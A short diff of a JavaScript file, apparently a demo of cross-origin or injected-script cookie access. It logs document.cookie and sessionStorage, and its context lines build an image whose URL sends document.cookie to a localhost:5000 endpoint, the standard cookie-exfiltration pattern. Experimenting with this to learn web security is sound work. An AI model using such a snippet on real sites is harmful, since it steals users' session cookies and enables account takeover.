@@ -23,7 +23,7 @@
 // </script>
 
 // </html>
-console.log(document.cookie, 'document.cookie')
+console.log(document.cookie,window.sessionStorage, '我是5000端口访问4000端口的document.cookie')
 const dom = document.createElement('img');
 dom.src = 'http://localhost:5000/img?c=' + document.cookie;
 document.body.appendChild(dom);
